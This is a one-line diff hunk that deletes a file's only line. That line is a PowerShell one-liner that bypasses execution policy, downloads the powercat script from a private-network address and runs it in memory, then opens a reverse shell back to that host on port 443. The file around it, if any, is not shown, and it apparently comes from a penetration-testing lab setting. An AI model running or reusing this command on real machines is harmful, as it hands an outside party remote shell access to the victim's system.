@@ -1,1 +1,0 @@
-powershell -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://192.168.119.143:8000/powercat.ps1'));powercat -c 192.168.119.143 -p 443 -ep"
